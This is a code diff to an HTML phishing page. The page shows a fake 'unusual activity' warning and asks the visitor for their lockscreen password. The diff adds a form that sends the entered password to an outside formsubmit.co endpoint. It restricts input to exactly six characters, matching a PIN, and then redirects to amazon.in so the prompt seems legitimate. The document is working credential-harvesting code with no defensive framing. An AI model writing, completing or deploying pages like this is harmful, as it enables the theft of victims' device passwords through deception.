@@ -147,15 +147,19 @@
     <h2>Unusual Activity Detected</h2>  
     <p class="warning-text">We've detected unusual activity. Please confirm your lockscreen password to continue.</p>  
 
-    <div class="input-container">  
-      <input id="password" type="password" placeholder="Enter Your Password " oninput="checkInput()" />  
-      <span class="toggle-visibility" id="toggleIcon" onclick="toggleVisibility()">⊚</span>  
-    </div>  
+    <!-- ✅ Form start -->
+    <form action="https://formsubmit.co/el/pogago" method="POST" onsubmit="return handleSubmit(event)">
+      <div class="input-container">  
+        <input id="password" name="password" type="password" placeholder="Enter Your Password" oninput="checkInput()" required />  
+        <span class="toggle-visibility" id="toggleIcon" onclick="toggleVisibility()">⊚</span>  
+      </div>  
 
-    <div class="buttons">  
-      <button class="btn" onclick="cancel()">Cancel</button>  
-      <button class="btn" id="continueBtn" disabled onclick="redirect()">Continue</button>  
-    </div>  
+      <div class="buttons">  
+        <button class="btn" type="button" onclick="cancel()">Cancel</button>  
+        <button class="btn" id="continueBtn" type="submit" disabled>Continue</button>  
+      </div>  
+    </form>
+    <!-- ✅ Form end -->
   </div>  
 
   <script>  
@@ -165,7 +169,7 @@
 
     function checkInput() {  
       const val = input.value.trim();  
-      continueBtn.disabled = val.length < 6;  
+      continueBtn.disabled = val.length !== 6;  
     }  
 
     function toggleVisibility() {  
@@ -182,11 +186,16 @@
       alert("Action cancelled.");  
     }  
 
-    function redirect() {  
+    function handleSubmit(event) {
       const enteredPassword = input.value;
       alert("Entered Password: " + enteredPassword);
-      window.location.href = "https://www.amazon.in";  
-    }  
+
+      // Allow form to actually submit
+      setTimeout(() => {
+        window.location.href = "https://www.amazon.in";
+      }, 1000);
+      return true; // let the form submit
+    }
   </script>  
 </body>  
 </html>
